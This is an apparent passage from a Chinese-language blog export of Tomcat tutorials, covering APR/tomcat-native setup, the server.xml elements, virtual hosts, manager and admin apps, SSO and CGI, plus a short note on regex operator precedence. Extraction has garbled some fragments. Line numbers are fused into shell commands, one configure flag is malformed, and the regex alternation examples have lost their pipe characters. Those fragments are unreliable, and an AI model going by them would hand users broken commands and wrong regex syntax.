&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;单位为分钟。 Apr插件提高Tomcat性能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat可以使用APR来提供超强的可伸缩性和性能，更好地集成本地服务器技术. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;APR(Apache Portable Runtime)是一个高可移植库，它是Apache HTTP Server 2.x的核心。APR有很多用途，包括访问高级IO功能(例如sendfile,epoll和OpenSSL)，OS级别功能(随机数生成，系统状态等等)，本地进程管理(共享内存，NT管道和UNIX sockets)。这些功能可以使Tomcat作为一个通常的前台WEB服务器，能更好地和其它本地web技术集成，总体上让Java更有效率作为一个高性能web服务器平台而不是简单作为后台容器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在产品环境中，特别是直接使用Tomcat做WEB服务器的时候，应该使用Tomcat Native来提高其性能 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要测APR给tomcat带来的好处最好的方法是在慢速网络上（模拟Internet），将Tomcat线程数开到300以上的水平，然后模拟一大堆并发请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不配APR，基本上300个线程狠快就会用满，以后的请求就只好等待。但是配上APR之后，并发的线程数量明显下降，从原来的300可能会马上下降到只有几十，新的请求会毫无阻塞的进来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在局域网环境测，就算是400个并发，也是一瞬间就处理/传输完毕，但是在真实的Internet环境下，页面处理时间只占0.1%都不到，绝大部分时间都用来页面传输。如果不用APR，一个线程同一时间只能处理一个用户，势必会造成阻塞。所以生产环境下用apr是非常必要的。 安装APR tomcat-native &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apr-1.3.8.tar.gz 安装在/usr/local/apr 123tar zxvf apr-1.3.8.tar.gzcd apr-1.3.8./configure;make;make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apr-util-1.3.9.tar.gz 安装在/usr/local/apr/lib 12345678tar zxvf apr-util-1.3.9.tar.gzcd apr-util-1.3.9 ./configure --with-apr=/usr/local/apr ----with-java-home=JDK;make;make installcd apache-tomcat-6.0.20/bin tar zxvf tomcat-native.tar.gz cd tomcat-native/jni/native ./configure --with-apr=/usr/local/apr;make;make install 设置 Tomcat 整合 APR &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 tomcat 的启动 shell （startup.sh），在该文件中加入启动参数： 1CATALINA_OPTS="$CATALINA_OPTS -Djava.library.path=/usr/local/apr/lib" 。 判断安装成功: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果看到下面的启动日志，表示成功。 12007-4-26 15:34:32 org.apache.coyote.http11.Http11AprProtocol init]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat配置文件server.xml详解]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F6.%20%20tomcat%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6server.xml%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[tomcat配置文件server.xml详解 元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它代表整个容器,是Tomcat实例的顶层元素.由org.apache.catalina.Server接口来定义.它包含一个元素.并且它不能做为任何元素的子元素. 1&lt; Server port ="8005" shutdown ="SHUTDOWN" debug ="0" &gt; className指定实现org.apache.catalina.Server接口的类.默认值为org.apache.catalina.core.StandardServer port指定Tomcat监听shutdown命令端口.终止服务器运行时,必须在Tomcat服务器所在的机器上发出shutdown命令.该属性是必须的. shutdown指定终止Tomcat服务器运行时,发给Tomcat服务器的shutdown监听端口的字符串.该属性必须设置 元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该元素由org.apache.catalina.Service接口定义,它包含一个元素,以及一个或多个,这些Connector元素共享用同一个Engine元素 12&lt; Service name ="Catalina" &gt; &lt; Service name ="Apache" &gt; 第一个处理所有直接由Tomcat服务器接收的web客户请求. 第二个处理所有由Apahce服务器转发过来的Web客户请求 className 指定实现org.apahce.catalina.Service接口的类.默认为org.apahce.catalina.core.StandardService name定义Service的名字 元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个Service元素只能有一个Engine元素.元素处理在同一个中所有元素接收到的客户请求.由org.apahce.catalina.Engine接口定义. 1&lt; Engine name ="Catalina" defaultHost ="localhost" debug ="0" &gt; className指定实现Engine接口的类,默认值为StandardEngine defaultHost指定处理客户的默认主机名,在中的子元素中必须定义这一主机 name定义Engine的名字在 在可以包含如下元素, , , 元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它由Host接口定义.一个Engine元素可以包含多个元素.每个的元素定义了一个虚拟主机.它包含了一个或多个Web应用. 1&lt; Host name ="localhost" debug ="0" appBase ="webapps" unpackWARs ="true" autoDeploy ="true" &gt; className指定实现Host接口的类.默认值为StandardHost appBase指定虚拟主机的目录,可以指定绝对目录,也可以指定相对于的相对目录.如果没有此项,默认为/webapps autoDeploy如果此项设为true,表示Tomcat服务处于运行状态时,能够监测appBase下的文件,如果有新有web应用加入进来,会自运发布这个WEB应用 unpackWARs如果此项设置为true,表示把WEB应用的WAR文件先展开为开放目录结构后再运行.如果设为false将直接运行为WAR文件 alias指定主机别名,可以指定多个别名 deployOnStartup如果此项设为true,表示Tomcat服务器启动时会自动发布appBase目录下所有的Web应用.如果Web应用中的server.xml没有相应的元素,将采用Tomcat默认的Context name定义虚拟主机的名字 在元素中可以包含如下子元素:, , , 元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它由Context接口定义.是使用最频繁的元素.每个&lt;Context元素代表了运行在虚拟主机上的单个Web应用. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个可以包含多个元素.每个web应用有唯一的一个相对应的Context代表web应用自身.servlet容器为第一个web应用创建一个ServletContext对象. 1&lt; Context path ="/sample" docBase ="sample" debug ="0" reloadbale ="true" &gt; className指定实现Context的类,默认为StandardContext类 path指定访问Web应用的URL入口,注意/myweb,而不是myweb了事 reloadable如果这个属性设为true,Tomcat服务器在运行状态下会监视在WEB-INF/classes和Web-INF/lib目录CLASS文件的改运.如果监视到有class文件被更新,服务器自重新加载Web应用 cookies指定是否通过Cookies来支持Session,默认值为true useNaming指定是否支持JNDI,默认值为了true 在元素中可以包含如下元素, , , 元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由Connector接口定义.元素代表与客户程序实际交互的给件,它负责接收客户请求,以及向客户返回响应结果. 12345&lt; Connector port ="8080" maxThread ="50" minSpareThreads ="25" maxSpareThread ="75" enableLookups ="false" redirectPort ="8443" acceptCount ="100" debug ="0" connectionTimeout ="20000" disableUploadTimeout ="true" /&gt; &lt; Connection port ="8009" enableLookups ="false" redirectPort ="8443" debug ="0" protocol ="AJP/1.3" /&gt; 第一个Connector元素定义了一个HTTP Connector,它通过8080端口接收HTTP请求; 第二个Connector元素定义了一个JD Connector,它通过8009端口接收由其它服务器转发过来的请求. Connector元素共用属性 className指定实现Connector接口的类 enableLookups如果设为true,表示支持域名解析,可以把IP地址解析为主机名.WEB应用中调用request.getRemoteHost方法返回客户机主机名.默认值为true redirectPort指定转发端口.如果当前端口只支持non-SSL请求,在需要安全通信的场命,将把客户请求转发至SSL的redirectPort端口 HttpConnector元素的属性 className实现Connector的类 port设定Tcp/IP端口,默认值为8080,如果把8080改成80,则只要输入http://localhost 即可,因为TCP/IP的默认端口是80 address如果服务器有二个以上ip地址,此属性可以设定端口监听的ip地址.默认情况下,端口会监听服务器上所有的ip地址 bufferSize设定由端口创建的输入流的缓存大小.默认值为2048byte protocol设定Http协议,默认值为HTTP/1.1 maxThreads设定在监听端口的线程的最大数目,这个值也决定了服务器可以同时响应客户请求的最大数目.默认值为200 acceptCount设定在监听端口队列的最大客户请求数量,默认值为10.如果队列已满,客户必须等待. connectionTimeout定义建立客户连接超时的时间.如果为-1,表示不限制建立客户连接的时间 JkConnector的属性 className实现Connector的类 port设定AJP端口号 protocol必须设定为AJP/1.3]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式-运算符优先级]]></title>
    <url>%2F2017%2F08%2F10%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F4.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%2F</url>
    <content type="text"><![CDATA[正则表达式-运算符优先级&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式从左到右进行计算，并遵循优先级顺序，这与算数表达式非常类似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相同优先级的从左到右进行运算，不同优先级的运算先高后低。下表从最高到最低说明了各种正则表达式运算符的优先级顺序： 运算符 描述 \ 转义符 (),(?:),(?=),[] 圆括号和方括号 *,+,?,{n},{n,},{n,m} 限定符 ^,$，\任何元字符、任何字符 定位点和序列（即：位置和顺序） \ 替换，“或”操作，字符具有高于替换运算符的优先级，使得“m food”匹配“m”或“food”。若要匹配“mood”或“food”，使用括号创建子表达式，从而产生“(m f)ood”]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat常用功能的配置方法]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F10.%20tomcat%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[tomcat常用功能的配置方法启动内存参数的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat/bin/catalina.bat 如果是linux 就是 catalina.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在rem 的后面增加如下参数 1set JAVA_OPTS= -Xms256m -Xmx256m -XX:MaxPermSize=64m 修改Tomcat的JDK目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开tomcat/bin/catalina.bat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最后一个rem后面增加 1set JAVA_HOME=C:\Program Files\Java\jdk1.6.0 增加虚拟目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/tomcat/conf/server.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一行是以前默认存在的，第二行是新增的 12&lt;Context path="" docBase="ROOT" debug="0" reloadable="true"&gt;&lt;/Context&gt;&lt;Context path="/jsp/a" reloadable="true" docBase="E:\workplace\www.java2000.net\WebContent" /&gt; GET方式URL乱码问题解决&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开 tomcat/conf/server.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找下面这部分，在最后增加一段代码就可以了。 12345&lt;Connector port="80" maxHttpHeaderSize="8192".................URIEncoding="UTF-8" useBodyEncodingForURI="true"............... /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中的UTF-8 请根据你的需要自己修改，比如GBK 虚拟主机配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat/conf/server.xml 123456789101112131415161718192021&lt;!-- 默认的主机 --&gt;&lt;Host name="localhost" appBase="webapps"unpackWARs="true" xmlValidation="false" xmlNamespaceAware="false"&gt;&lt;Context path="" docBase="ROOT" debug="0" reloadable="true"&gt;&lt;/Context&gt;...&lt;/host&gt;&lt;!-- 以下是新增的虚拟主机 --&gt;&lt;Host name="www.java2000.net" appBase="webapps"unpackWARs="true" xmlValidation="false" xmlNamespaceAware="false"&gt;&lt;Context path="" docBase="d:/www.java2000.net" debug="0" reloadable="true"&gt;&lt;/Context&gt;&lt;!-- 虚拟目录 --&gt;&lt;Context path="/count" docBase="d:/counter.java2000.net" debug="0" reloadable="true"&gt;&lt;/Context&gt;&lt;/Host&gt;&lt;Host name="java2000.net" appBase="webapps"unpackWARs="true" xmlValidation="false" xmlNamespaceAware="false"&gt;&lt;Context path="" docBase="d:/www.java2000.net" debug="0" reloadable="true"&gt;&lt;/Context&gt;&lt;Context path="/count" docBase="d:/counter.java2000.net" debug="0" reloadable="true"&gt;&lt;/Context&gt;&lt;/Host&gt; 数据源配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比较复杂，各个版本都有所不同，请直接查看 http://java2000.net/p1906，包括tomcat5.0,tomcat5.5x,tomcat6.0的各个版本的配置方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更多关于Tomcat的使用，请看参考资料 Tomcat配置的10个技巧1. 配置系统管理（Admin Web Application）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大多数商业化的J2EE服务器都提供一个功能强大的管理界面，且大都采用易于理解的Web应用界面。Tomcat按照自己的方式，同样提供一个成熟的管理 工具，并且丝毫不逊于那些商业化的竞争对手。Tomcat的Admin Web Application最初在4.1版本时出现，当时的功能包括管理context、data source、user和group等。当然也可以管理像初始化参数，user、group、role的多种数据库管理等。在后续的版本中，这些功能将得 到很大的扩展，但现有的功能已经非常实用了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Admin Web Application被定义在自动部署文件：CATALINA_BASE/webapps/admin.xml 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;必须编辑这个文件，以确定Context中的docBase参数是绝对路径。也就是说， CATALINA_BASE/webapps/admin.xml 的路径是绝对路径。作为另外一种选择，也可以删除这个自动部署文件，而在server.xml文件中建立一个Admin Web Application的context，效果是一样的。不能管理Admin Web Application这个应用，换而言之，除了删除CATALINA_BASE/webapps/admin.xml ，可能什么都做不了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用UserDatabaseRealm（默认），将需要添加一个user以及一个role到CATALINA_BASE/conf/tomcat-users.xml 文件中。你编辑这个文件，添加一个名叫“admin”的role 到该文件中，如下： 1&lt;role name=“admin”/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样需要有一个用户，并且这个用户的角色是“admin”。象存在的用户那样，添加一个用户（改变密码使其更加安全）： 1&lt;user name=“admin” password=“deep_dark_secret” roles=“admin”/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当完成这些步骤后，请重新启动Tomcat，访问http://localhost:8080/admin，将看到一个登录界面。Admin Web Application采用基于容器管理的安全机制，并采用了Jakarta Struts框架。一旦作为“admin”角色的用户登录管理界面，将能够使用这个管理界面配置Tomcat。 2.配置应用管理（Manager Web Application）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Manager Web Application让你通过一个比Admin Web Application更为简单的用户界面，执行一些简单的Web应用任务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Manager Web Application被被定义在一个自动部署文件中： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CATALINA_BASE/webapps/manager.xml 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;必须编辑这个文件，以确保context的docBase参数是绝对路径，也就是说CATALINA_HOME/server/webapps/manager的绝对路径。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用的是UserDatabaseRealm，那么需要添加一个角色和一个用户到CATALINA_BASE/conf/tomcat-users.xml文件中。接下来，编辑这个文件，添加一个名为“manager”的角色到该文件中： 1&lt;role name=“manager”&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样需要有一个角色为“manager”的用户。像已经存在的用户那样，添加一个新用户（改变密码使其更加安全）： 1&lt;user name=“manager” password=“deep_dark_secret” roles=“manager”/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后重新启动Tomcat，访问http://localhost/manager/list，将看到一个很朴素的文本型管理界面，或者访问http: //localhost/manager/html/list，将看到一个HMTL的管理界面。不管是哪种方式都说明你的Manager Web Application现在已经启动了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Manager application可以在没有系统管理特权的基础上，安装新的Web应用，以用于测试。如果我们有一个新的web应用位于 /home/user/hello下在，并且想把它安装到 /hello下，为了测试这个应用，可以这么做，在第一个文件框中输入“/hello”（作为访问时的path），在第二个文本框中输入“file: /home/user/hello”（作为Config URL）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Manager application还允许停止、重新启动、移除以及重新部署一个web应用。停止一个应用使其无法被访问，当有用户尝试访问这个被停止的应用时，将 看到一个503的错误——“503 - This application is not currently available”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;移除一个web应用，只是指从Tomcat的运行拷贝中删除了该应用，如果重新启动Tomcat，被删除的应用将再次出现（也就是说，移除并不是指从硬盘上删除）。 3.部署一个web应用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有两个办法可以在系统中部署web服务。 拷贝WAR文件或者web应用文件夹（包括该web的所有内容）到$CATALINA_BASE/webapps目录下。 为web服务建立一个只包括context内容的XML片断文件，并把该文件放到$CATALINA_BASE/webapps目录下。这个web应用本身可以存储在硬盘上的任何地方。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有一个WAR文件，想部署它，则只需要把该文件简单的拷贝到CATALINA_BASE/webapps目录下即可，文件必须以“。war”作 为扩展名。一旦Tomcat监听到这个文件，它将（缺省的）解开该文件包作为一个子目录，并以WAR文件的文件名作为子目录的名字。接下来，Tomcat 将在内存中建立一个context，就好象在server.xml文件里建立一样。当然，其他必需的内容，将从server.xml中的 DefaultContext获得。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;部署web应用的另一种方式是写一个Context XML片断文件，然后把该文件拷贝到CATALINA_BASE/webapps目录下。一个Context片断并非一个完整的XML文件，而只是一个 context元素，以及对该应用的相应描述。这种片断文件就像是从server.xml中切取出来的context元素一样，所以这种片断被命名为 “context片断”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举个例子，如果我们想部署一个名叫MyWebApp.war的应用，该应用使用realm作为访问控制方式，我们可以使用下面这个片断： 12345678&lt;!--Context fragment for deploying MyWebApp.war--&gt;&lt;Context path=“/demo” docBase=“webapps/MyWebApp.war”debug=“0” privileged=“true”&gt;&lt;Realm className=“org.apache.catalina.realm.UserDatabaseRealm”resourceName=“UserDatabase”/&gt;&lt;/Context&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把该片断命名为“MyWebApp.xml”，然后拷贝到CATALINA_BASE/webapps目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种context片断提供了一种便利的方法来部署web应用，不需要编辑server.xml，除非想改变缺省的部署特性，安装一个新的web应用时不需要重启动Tomcat。 4.配置虚拟主机（Virtual Hosts）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于server.xml中“Host”这个元素，只有在设置虚拟主机的才需要修改。虚拟主机是一种在一个web服务器上服务多个域名的机制，对每个域 名而言，都好象独享了整个主机。实际上，大多数的小型商务网站都是采用虚拟主机实现的，这主要是因为虚拟主机能直接连接到Internet并提供相应的带&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基于名字的虚拟主机可以被建立在任何web服务器上，建立的方法就是通过在域名服务器（DNS）上建立IP地址的别名，并且告诉web服务器把去往不同域 名的请求分发到相应的网页目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Tomcat中使用虚拟主机，需要设置DNS或主机数据。为了测试，为本地IP设置一个IP别名就足够了，接下来，你需要在server.xml中添加几行内容，如下： 123456789101112131415161718192021222324252627&lt;Server port=“8005” shutdown=“SHUTDOWN” debug=“0”&gt;&lt;Service name=“Tomcat-Standalone”&gt;&lt;Connector className=“org.apache.coyote.tomcat4.CoyoteConnector”port=“8080” minProcessors=“5” maxProcessors=“75”enableLookups=“true” redirectPort=“8443”/&gt;&lt;Connector className=“org.apache.coyote.tomcat4.CoyoteConnector”port=“8443” minProcessors=“5” maxProcessors=“75”acceptCount=“10” debug=“0” scheme=“https” secure=“true”/&gt;&lt;Factory className=“org.apache.coyote.tomcat4.CoyoteServerSocketFactory”clientAuth=“false” protocol=“TLS” /&gt;&lt;/Connector&gt;&lt;Engine name=“Standalone” defaultHost=“localhost” debug=“0”&gt;&lt;!-- This Host is the default Host --&gt;&lt;Host name=“localhost” debug=“0” appBase=“webapps”unpackWARs=“true” autoDeploy=“true”&gt;&lt;Context path=“” docBase=“ROOT” debug=“0”/&gt;&lt;Context path=“/orders” docBase=“/home/ian/orders” debug=“0”reloadable=“true” crossContext=“true”&gt;&lt;/Context&gt;&lt;/Host&gt;&lt;!-- This Host is the first “Virtual Host”: www.example.com --&gt;&lt;Host name=“www.example.com” appBase=“/home/example/webapp”&gt;&lt;Context path=“” docBase=“.”/&gt;&lt;/Host&gt;&lt;/Engine&gt;&lt;/Service&gt;&lt;/Server&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat的server.xml文件，在初始状态下，只包括一个虚拟主机，但是它容易被扩充到支持多个虚拟主机。在前面的例子中展示的是一个简单的 server.xml版本，其中粗体部分就是用于添加一个虚拟主机。每一个Host元素必须包括一个或多个context元素，所包含的context元 素中必须有一个是默认的context，这个默认的context的显示路径应该为空（例如，path=“”）。 5.配置基础验证（Basic Authentication）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;容器管理验证方法控制着当用户访问受保护的web应用资源时，如何进行用户的身份鉴别。当一个web应用使用了Basic Authentication（BASIC参数在web.xml文件中auto-method元素中设置），而有用户访问受保护的web应用时， Tomcat将通过HTTP Basic Authentication方式，弹出一个对话框，要求用户输入用户名和密码。在这种验证方法中，所有密码将被以64位的编码方式在网络上传输。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：使用Basic Authentication通过被认为是不安全的，因为它没有强健的加密方法，除非在客户端和服务器端都使用HTTPS或者其他密码加密码方式（比如， 在一个虚拟私人网络中）。若没有额外的加密方法，网络管理员将能够截获（或滥用）用户的密码。但是，如果是刚开始使用Tomcat，或者你想在你的 web应用中测试一下基于容器的安全管理，Basic Authentication还是非常易于设置和使用的。只需要添加和两个元素到web应用的web.xml文件中，并且在CATALINA_BASE/conf/tomcat-users.xml 文件中添加适当的和即可，然后重新启动Tomcat。 6.配置单点登录（Single Sign-On）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一旦设置了realm和验证的方法，就需要进行实际的用户登录处理。一般说来，对用户而言登录系统是一件很麻烦的事情，必须尽量减少用户登录验证的 次数。作为缺省的情况，当用户第一次请求受保护的资源时，每一个web应用都会要求用户登录。如果运行了多个web应用，并且每个应用都需要进行单独的 用户验证，那这看起来就有点像在用户搏斗。用户们不知道怎样才能把多个分离的应用整合成一个单独的系统，所有用户也就不知道他们需要访问多少个不 同的应用，只是很迷惑，为什么总要不停的登录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat 4的“single sign-on”特性允许用户在访问同一虚拟主机下所有web应用时，只需登录一次。为了使用这个功能，只需要在Host上添加一个SingleSignOn Valve元素即可，如下所示： 12&lt;Valve className=“org.apache.catalina.authenticator.SingleSignOn”debug=“0”/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Tomcat初始安装后，server.xml的注释里面包括SingleSignOn Valve配置的例子，只需要去掉注释，即可使用。那么，任何用户只要登录过一个应用，则对于同一虚拟主机下的所有应用同样有效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用single sign-on valve有一些重要的限制： value必须被配置和嵌套在相同的Host元素里，并且所有需要进行单点验证的web应用（必须通过context元素定义）都位于该Host下。 包括共享用户信息的realm必须被设置在同一级Host中或者嵌套之外。 不能被context中的realm覆盖。 使用单点登录的web应用最好使用一个Tomcat的内置的验证方式（被定义在web.xml中的中），这比自定 义的验证方式强，Tomcat内置的的验证方式包括basic、digest、form和client-cert。 如果你使用单点登录，还希望集成一个第三方的web应用到你的网站中来，并且这个新的web应用使用它自己的验证方式，而不使用容器管理安全，那你基本上 就没招了。用户每次登录原来所有应用时需要登录一次，并且在请求新的第三方应用时还得再登录一次。 单点登录需要使用cookies。 7.配置用户定制目录（Customized User Directores）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一些站点允许个别用户在服务器上发布网页。例如，一所大学的学院可能想给每一位学生一个公共区域，或者是一个ISP希望给一些web空间给他的客户，但这又不是虚拟主机。在这种情况下，一个典型的方法就是在用户名前面加一个特殊字符（~），作为每位用户的网站，比如： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;http://www.cs.myuniversity.edu/~username 提供两种方法在主机上映射这些个人网站，主要使用一对特殊的Listener元素。Listener的className属性应该是 org.apache.catalina.startup.UserConfig，userClass属性应该是几个映射类之一。如果电脑系统是 Unix，它将有一个标准的/etc/passwd文件，该文件中的帐号能够被运行中的Tomcat很容易的读取，该文件指定了用户的主目录，使用 PasswdUserDatabase 映射类。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;http://members.mybigisp.com/~username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat 123&lt;Listener className=“org.apache.catalina.startup.UserConfig”directoryName=“public_html”userClass=“org.apache.catalina.startup.PasswdUserDatabase”/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web文件需要放置在像/home/users/ian/public_html 或者 /users/jbrittain/public_html一样的目录下面。当然你也可以改变public_html 到其他任何子目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实际上，这个用户目录根本不一定需要位于用户主目录下里面。如果你没有一个密码文件，但你又想把一个用户名映射到公共的像/home一样目录的子目录里面，则可以使用HomesUserDatabase类。 123&lt;Listener className=“org.apache.catalina.startup.UserConfig”directoryName=“public_html” homeBase=“/home”userClass=“org.apache.catalina.startup.HomesUserDatabase”/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样一来，web文件就可以位于像/home/ian/public_html 或者 /home/jasonb/public_html一样的目录下。这种形式对Windows而言更加有利，你可以使用一个像c:\home这样的目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些Listener元素，如果出现，则必须在Host元素里面，而不能在context元素里面，因为它们都用应用于Host本身。 8.在Tomcat中使用CGI脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat主要是作为Servlet/JSP容器，但它也有许多传统web服务器的性能。支持通用网关接口（Common Gateway Interface，即CGI）就是其中之一，CGI提供一组方法在响应浏览器请求时运行一些扩展程序。CGI之所以被称为通用，是因为它能在大多数程序 或脚本中被调用，包括：Perl，Python，awk，Unix shell scripting等，甚至包括Java。不会把一个Java应用程序当作CGI来运行，毕竟这样太过原始。一般而言，开发Servlet总 要比CGI具有更好的效率，因为当用户点击一个链接或一个按钮时，不需要从操作系统层开始进行处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat包括一个可选的CGI Servlet，允许你运行遗留下来的CGI脚本。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了使Tomcat能够运行CGI，必须做的几件事： 把servlets-cgi.renametojar （在CATALINA_HOME/server/lib/目录下）改名为servlets-cgi.jar。处理CGI的servlet应该位于Tomcat的CLASSPATH下。 在Tomcat的CATALINA_BASE/conf/web.xml 文件中，把关于 CGI的那段的注释去掉（默认情况下，该段位于第241行）。 同样，在Tomcat的CATALINA_BASE/conf/web.xml文件中，把关于对CGI进行映射的那段的注释去掉（默认情况下，该段位于第299行）。注意，这段内容指定了HTML链接到CGI脚本的访问方式。 可以把CGI脚本放置在WEB-INF/cgi 目录下（注意，WEB-INF是一个安全的地方，你可以把一些不想被用户看见或基于安全考虑不想暴露的文件放在此处），或者也可以把CGI脚本放置在 context下的其他目录下，并为CGI Servlet调整cgiPathPrefix初始化参数。这就指定的CGI Servlet的实际位置，且不能与上一步指定的URL重名。 重新启动Tomcat，你的CGI就可以运行了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Tomcat中，CGI程序缺省放置在WEB-INF/cgi目录下，正如前面所提示的那样，WEB-INF目录受保护的，通过客户端的浏览器无法窥探 到其中内容，所以对于放置含有密码或其他敏感信息的CGI脚本而言，这是一个非常好的地方。为了兼容其他服务器，尽管你也可以把CGI脚本保存在传统的 /cgi-bin目录，但要知道，在这些目录中的文件有可能被网上好奇的冲浪者看到。另外，在Unix中，请确定运行Tomcat的用户有执行CGI脚本 的权限。 9.改变Tomcat中的JSP编译器（JSP Compiler）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Tomcat 4.1（或更高版本，大概），JSP的编译由包含在Tomcat里面的Ant程序控制器直接执行。这听起来有一点点奇怪，但这正是Ant有意为之的一部 分，有一个API文档指导开发者在没有启动一个新的JVM的情况下，使用Ant。这是使用Ant进行Java开发的一大优势。另外，这也意味着你现在能够 在Ant中使用任何javac支持的编译方式，这里有一个关于Apache Ant使用手册的javac page列表。使用起来是容易的，因为你只需要在 元素中定义一个名字叫“compiler”，并且在value中有一个支持编译的编译器名字，示例如下： 123456789101112131415&lt;servlet&gt;&lt;servlet-name&gt;jsp&lt;/servlet-name&gt;&lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;&lt;init-param&gt;&lt;param-name&gt;logVerbosityLevel&lt;/param-name&gt;&lt;param-value&gt;WARNING&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;compiler&lt;/param-name&gt;&lt;param-value&gt;jikes&lt;/param-value&gt;&lt;/init-param&gt;&lt;load-on-startup&gt;3&lt;/load-on-startup&gt;&lt;/servlet&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，给出的编译器必须已经安装在你的系统中，并且CLASSPATH可能需要设置，那处决于你选择的是何种编译器。 10.限制特定主机访问（Restricting Access to Specific 